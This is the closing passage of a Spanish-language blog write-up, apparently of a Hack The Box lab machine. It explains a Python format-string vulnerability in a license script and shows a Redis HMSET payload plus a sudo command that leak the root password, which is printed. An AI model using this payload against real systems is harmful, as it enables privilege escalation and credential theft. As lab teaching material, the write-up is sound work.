+    <span class="n">license_key</span> <span class="o">=</span> <span class="p">(</span><span class="n">prefix</span> <span class="o">+</span> <span class="n">username</span> <span class="o">+</span> <span class="sh">"</span><span class="s">{license.license}</span><span class="sh">"</span> <span class="o">+</span> <span class="n">firstlast</span><span class="p">).</span><span class="nf">format</span><span class="p">(</span><span class="n">license</span><span class="o">=</span><span class="n">l</span><span class="p">)</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sh">""</span><span class="p">)</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Plaintext license key:</span><span class="sh">"</span><span class="p">)</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">------------------------------------------------------</span><span class="sh">"</span><span class="p">)</span>
+    <span class="nf">print</span><span class="p">(</span><span class="n">license_key</span><span class="p">)</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sh">""</span><span class="p">)</span>
+    <span class="n">license_key_encoded</span> <span class="o">=</span> <span class="n">license_key</span><span class="p">.</span><span class="nf">encode</span><span class="p">()</span>
+    <span class="n">license_key_encrypted</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="nf">encrypt</span><span class="p">(</span><span class="n">license_key_encoded</span><span class="p">)</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Encrypted license key (distribute to customer):</span><span class="sh">"</span><span class="p">)</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">------------------------------------------------------</span><span class="sh">"</span><span class="p">)</span>
+    <span class="nf">print</span><span class="p">(</span><span class="n">license_key_encrypted</span><span class="p">.</span><span class="nf">decode</span><span class="p">())</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sh">""</span><span class="p">)</span>
+    <span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">/root/license/keys</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">a</span><span class="sh">"</span><span class="p">)</span> <span class="k">as</span> <span class="n">license_keys_file</span><span class="p">:</span>
+        <span class="n">license_keys_file</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">provision</span> <span class="o">+</span> <span class="sh">"</span><span class="s">:</span><span class="sh">"</span> <span class="o">+</span> <span class="n">license_key_encrypted</span><span class="p">.</span><span class="nf">decode</span><span class="p">()</span> <span class="o">+</span> <span class="sh">"</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
+
+<span class="c1">#deprovision
+</span><span class="nf">if</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">deprovision</span><span class="p">):</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sh">""</span><span class="p">)</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">License key deprovisioning coming soon</span><span class="sh">"</span><span class="p">)</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sh">""</span><span class="p">)</span>
+    <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">()</span>
+
+<span class="c1">#check
+</span><span class="nf">if</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">check</span><span class="p">):</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sh">""</span><span class="p">)</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">license_key_decrypted</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="nf">decrypt</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">check</span><span class="p">.</span><span class="nf">encode</span><span class="p">())</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">License key valid! Decrypted value:</span><span class="sh">"</span><span class="p">)</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">------------------------------------------------------</span><span class="sh">"</span><span class="p">)</span>
+        <span class="nf">print</span><span class="p">(</span><span class="n">license_key_decrypted</span><span class="p">.</span><span class="nf">decode</span><span class="p">())</span>
+    <span class="k">except</span><span class="p">:</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">License key invalid</span><span class="sh">"</span><span class="p">)</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sh">""</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Podemos ver que recibe 3 argumentos:</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">group</span><span class="p">.</span><span class="nf">add_argument</span><span class="p">(</span><span class="sh">'</span><span class="s">-p</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">--provision</span><span class="sh">'</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="sh">'</span><span class="s">Provision license key for specified user</span><span class="sh">'</span><span class="p">,</span> <span class="n">metavar</span><span class="o">=</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">group</span><span class="p">.</span><span class="nf">add_argument</span><span class="p">(</span><span class="sh">'</span><span class="s">-d</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">--deprovision</span><span class="sh">'</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="sh">'</span><span class="s">Deprovision license key for specified user</span><span class="sh">'</span><span class="p">,</span> <span class="n">metavar</span><span class="o">=</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">group</span><span class="p">.</span><span class="nf">add_argument</span><span class="p">(</span><span class="sh">'</span><span class="s">-c</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">--check</span><span class="sh">'</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="sh">'</span><span class="s">Check if specified license key is valid</span><span class="sh">'</span><span class="p">,</span> <span class="n">metavar</span><span class="o">=</span><span class="sh">'</span><span class="s">license_key</span><span class="sh">'</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Y la parte interesante es esta al momento de generar la licencia para el usuario:</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">license_key</span> <span class="o">=</span> <span class="p">(</span><span class="n">prefix</span> <span class="o">+</span> <span class="n">username</span> <span class="o">+</span> <span class="sh">"</span><span class="s">{license.license}</span><span class="sh">"</span> <span class="o">+</span> <span class="n">firstlast</span><span class="p">).</span><span class="nf">format</span><span class="p">(</span><span class="n">license</span><span class="o">=</span><span class="n">l</span><span class="p">)</span>
+</code></pre></div></div>
+
+<ul>
+  <li>prefix, username y firstlast son unas partes de la licencia que se generara</li>
+  <li>Con {license.license} y license=1, se le esta diciendo que acceda a un atributo en especifico del objeto el cual es una instancia de la clase Licence, donde el atributo es la licencia, como se puede ver aca</li>
+</ul>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">class</span> <span class="nc">License</span><span class="p">():</span>
+    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="n">self</span><span class="p">):</span>
+        <span class="n">chars</span> <span class="o">=</span> <span class="n">string</span><span class="p">.</span><span class="n">ascii_letters</span> <span class="o">+</span> <span class="n">string</span><span class="p">.</span><span class="n">digits</span> <span class="o">+</span> <span class="n">string</span><span class="p">.</span><span class="n">punctuation</span>
+        <span class="n">self</span><span class="p">.</span><span class="n">license</span> <span class="o">=</span> <span class="sh">''</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">random</span><span class="p">.</span><span class="nf">choice</span><span class="p">(</span><span class="n">chars</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">40</span><span class="p">))</span>
+        <span class="n">self</span><span class="p">.</span><span class="n">created</span> <span class="o">=</span> <span class="n">date</span><span class="p">.</span><span class="nf">today</span><span class="p">()</span>
+</code></pre></div></div>
+
+<ul>
+  <li>El <code class="language-plaintext highlighter-rouge">format()</code> se esta utilizando para reemplazar el valor de la posición 1 en la cadena de <code class="language-plaintext highlighter-rouge">license</code>, con los valores que corresponde, es decir, el marcador de posición de <code class="language-plaintext highlighter-rouge">{license.license}</code> se reemplaza por el valor del atributo <code class="language-plaintext highlighter-rouge">license</code> de la clase <code class="language-plaintext highlighter-rouge">License</code>, el cual viene como argumento por CLI, el problema es que mediante <code class="language-plaintext highlighter-rouge">format()</code> podemos acceder directamente a las propiedades de un objeto para obtener su valor, como por ejemplo, podemos acceder a los de la clase <code class="language-plaintext highlighter-rouge">License</code>, sin embargo, el problema grave viene por que tambien podemos acceder directamenta a otros atributos fuera de la clase para recuperar el valor de cualquier otra variable o atributo que este en el programa, eso lo podemos hacer con <code class="language-plaintext highlighter-rouge">__init__</code> y <code class="language-plaintext highlighter-rouge">__globals__</code>, ahora, guiandome de <a href="https://podalirius.net/en/articles/python-format-string-vulnerabilities/">aca</a> explotaremos esta vulnerabilidad, usaremos redis otra vez: <code class="language-plaintext highlighter-rouge">redis-cli -s /var/run/redis/redis.sock</code>
+</li>
+</ul>
+
+<p>Ahora dentro de redis, usaremos <code class="language-plaintext highlighter-rouge">HMSET</code> para establecer varios valores en una clave:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HMSET c4rta first-name "{license.__init__.__globals__[secret_encoded]}" last-name hola username c4rta
+</code></pre></div></div>
+
+<p>En este caso, estamos estableciendo first-name, last-name y username en la clave “c4rta” dentro de una estructura hash, y el valor que le asignamos a first-name es <code class="language-plaintext highlighter-rouge">{license.init.globals[secret_encoded]}</code> donde estamos llamando a <code class="language-plaintext highlighter-rouge">secret_encoded</code> el cual es una variable en el archivo que analizamos y el cual contiene la licencia, que vendria siendo la contraseña, como se ve aca:</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">secret</span> <span class="o">=</span> <span class="p">[</span><span class="n">line</span><span class="p">.</span><span class="nf">strip</span><span class="p">()</span> <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">/root/license/secret</span><span class="sh">"</span><span class="p">)][</span><span class="mi">0</span><span class="p">]</span>
+<span class="n">secret_encoded</span> <span class="o">=</span> <span class="n">secret</span><span class="p">.</span><span class="nf">encode</span><span class="p">()</span>
+</code></pre></div></div>
+<p>Asi que ahora si llamamos al archivo con la licencia <code class="language-plaintext highlighter-rouge">c4rta</code> nos debe de mostrar la contraseña de root <code class="language-plaintext highlighter-rouge">sudo /usr/bin/license -p c4rta</code></p>
+
+<p><img src="/assets/img/htb-format/20.png" alt=""></p>
+
+<p>Y ya esta: la contraseña de root es <code class="language-plaintext highlighter-rouge">unCR4ckaBL3Pa$$w0rd</code></p>
+
+<p><img src="/assets/img/htb-format/21.png" alt=""></p>
+
+<p>Eso ha sido todo, gracias por leer ❤</p>
+
+<p><img src="/assets/img/htb-format/waifu.gif" alt=""></p>
+
+
+    </div>
+    
+    
+</article>
+<div class="post-nav">
+<a class="previous" href="/maldev/2023/06/10/inyeccion-shellcodes-mmap.html" title="Inyeccion de shellcodes usando la syscall mmap">Inyeccion de shellcodes usando la syscall...</a><a class="next" href="/maldev/2023/06/15/maldev-createRemoteThread.html" title="Inyeccion de shellcode via CreateRemoteThread + IsDebuggerPresent">Inyeccion de shellcode via CreateRemoteThread +...</a>
+</div>
+<div class="post-related">
+      <div>Related Articles</div>
+      <ul>
+        <li><a class="post-link" href="/explotacion%20binaria/2022/07/29/ret2libc.html" title="Inyeccion de shellcode via CreateRemoteThread + IsDebuggerPresent">ret2libc bypass NX</a></li>
+<li><a class="post-link" href="/2023/05/02/GNUradio-IQ-signal.html" title="Inyeccion de shellcode via CreateRemoteThread + IsDebuggerPresent">GNU Radio - Señal IQ sinusoidal</a></li>
+<li><a class="post-link" href="/explotacion%20binaria/2022/12/20/prng-bad-seeds.html" title="Inyeccion de shellcode via CreateRemoteThread + IsDebuggerPresent">Explotanto un PRNG bad seed</a></li>
+<li><a class="post-link" href="/maldev/2023/07/17/heap-queueUserApc.html" title="Inyeccion de shellcode via CreateRemoteThread + IsDebuggerPresent">Shellcode almacenada en el heap e inyección vía APC injection y NtTestAlert...</a></li>
+</ul>
+    </div>
+<div class="post-comments"></div></section>
+  
+<script src="https://unpkg.com/vanilla-back-to-top@7.2.1/dist/vanilla-back-to-top.min.js"></script>
+<script>addBackToTop({
+  diameter: 56,
+  backgroundColor: '#ff5100',
+  textColor: '#fff'
+})</script>
+  
+  
+</div>
+
+
+  </section>
+  <section class="sidebar" style="margin-left: 15px;">
+    <!-- Get sidebar items --></section>
+</div>
+
+<script src="https://unpkg.com/vanilla-back-to-top@7.2.1/dist/vanilla-back-to-top.min.js"></script>
+<script>addBackToTop({
+  diameter: 56,
+  backgroundColor: '#ff5100',
+  textColor: '#fff'
+})</script>
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div align="center" class="wrapper">
+    <div class="site-footer-inner">
+<div class="footer-col rss-subscribe">
+	  <font size="1" color="gray">
+	  <!--RSS SVG-->
+   	<svg aria-hidden="true" fill="#ff4e00" height="12" width="12" viewbox="0 0 16 16" version="1.1" data-view-component="true" class="octicon octicon-rss mr-1">
+    <path fill-rule="evenodd" d="M2.002 2.725a.75.75 0 01.797-.699C8.79 2.42 13.58 7.21 13.974 13.201a.75.75 0 11-1.497.098 10.502 10.502 0 00-9.776-9.776.75.75 0 01-.7-.798zM2 13a1 1 0 112 0 1 1 0 01-2 0zm.84-5.95a.75.75 0 00-.179 1.489c2.509.3 4.5 2.291 4.8 4.8a.75.75 0 101.49-.178A7.003 7.003 0 002.838 7.05z"></path>
+    </svg>
+	  <a href="/feed.xml" target="_blank"> RSS </a>订阅 |  
+    <!--提供支持-->
+    由 <a title="Jekyll is a simple, blog-aware, static site
+    generator." href="http://jekyllrb.com/" target="_blank">Jekyll</a> &amp; <a title="Yat, yet
+    another theme." href="https://github.com/jeffreytse/jekyll-theme-yat" target="_blank">Yat Theme</a>提供支持
+	  </font>
+</div>
+
+    <!--版权-->
+    <div>
+    <font size="1" color="gray">
+    Copyright © 2017-2023 <a href="https://github.com/ic4rta/">c4rta</a> All Rights Reserved
+    </font>
+</div>
+
+      <!--logo
+  <div>
+
+    <a href="https://github.com/vanhiupun" target="_blank">
+      <img src="https://visitor-badge.glitch.me/badge?page_id=vanhiupun.visitor-badge&right_color=Orange" alt="visitor" />
+    </a> 
+	    
+    <a href="https://github.com/vanhiupun/Vanhiupun.github.io/actions/workflows/jekyll.yml" target="_blank">
+        <img src="https://github.com/vanhiupun/Vanhiupun.github.io/actions/workflows/jekyll.yml/badge.svg" />
+    </a>
+      
+    <a href="https://github.com/vanhiupun/Vanhiupun.github.io/actions/workflows/codeql-analysis.yml" target="_blank">
+      <img src="https://github.com/vanhiupun/Vanhiupun.github.io/actions/workflows/codeql-analysis.yml/badge.svg">
+    </a> 
+      
+    <a href="https://github.com/vanhiupun/Vanhiupun.github.io" target="_blank">
+      <img src="https://www.codefactor.io/repository/github/vanhiupun/vanhiupun.github.io/badge" alt="CodeFactor" />
+    </a>
+    
+    <a href="https://codeclimate.com/github/vanhiupun/Vanhiupun.github.io/maintainability">
+      <img src="https://api.codeclimate.com/v1/badges/708da11ffb90a8f6f13b/maintainability" alt="maintainability" />
+    </a>
+    
+    <a href="https://rubygems.org/gems/jekyll-theme-yat" target="_blank">
+        <img src="https://badge.fury.io/rb/jekyll-theme-yat.svg"     alt="jekyll-theme-yat" />
+    </a> 
+    
+    <a href="https://github.com/vanhiupun" target="_blank">
+        <img src="https://img.shields.io/badge/Github%20Repository-222222?style=flat-square&logo=github&logoColor=ffffff" alt="Github" />
+    </a> 
+          
+    <a href="https://vanhiupun.github.io" target="_blank">
+        <img src="https://img.shields.io/badge/Github%20Page-222222?style=flat-square&logo=github&logoColor=ffffff" alt="Blog" />
+    </a> 
+          
+    <a href="mailto:fanxiaobin422@gmail.com" target="_blank">
+        <img src="https://img.shields.io/badge/Send%20me%20Gmail-EA4335?style=flat-square&logo=Gmail&logoColor=ffffff" alt="Gmail" />
+    </a> 
+          
+    <a href="https://github.com/vanhiupun/Vanhiupun.github.io/blob/c0c037532393ee2718892f87b200a0bbe33e7eb9/License" target="_blank">
+        <img src="https://img.shields.io/badge/License%20MIT-f2cb05?style=flat-square&logo=Mitsubishi&logoColor=222222" alt="MIT" />
+    </a>
+          
+    <a href="http://jekyllthemes.org/" target="_blank">
+        <img src="https://img.shields.io/badge/Jekyll%20Themes-f2cb05?style=flat-square&logo=Jekyll&logoColor=222222" alt="jekyll-themes" />
+    </a> 
+    
+    <a href="https://github.com/jeffreytse/jekyll-theme-yat" target="_blank">
+        <img src="https://img.shields.io/badge/Jekyll%C2%B7Theme%C2%B7Yat-f2cb05?style=flat-square&logo=github&logoColor=181717" alt="Jekyll-yat" />
+    </a> 
+      
+    <a href="https://raw.githubusercontent.com/vanhiupun/Vanhiupun.github.io/master/assets/images/img/zz.png" target="_blank">
+        <img src="https://img.shields.io/badge/GitHub%20Sponsors-EA4335?style=flat-square&logo=GitHub%20Sponsors&logoColor=222222" alt="/GitHub%20Sponsors" />
+    </a> 
+  </div>-->
+  </div>
+  </div>
+</footer>
+</body>
+</html><html>
+<script src="https://unpkg.com/vanilla-back-to-top@7.2.1/dist/vanilla-back-to-top.min.js"></script>
+<script>addBackToTop({
+  diameter: 56,
+  backgroundColor: '#ff5100',
+  textColor: '#fff'
+})</script>
+</html>
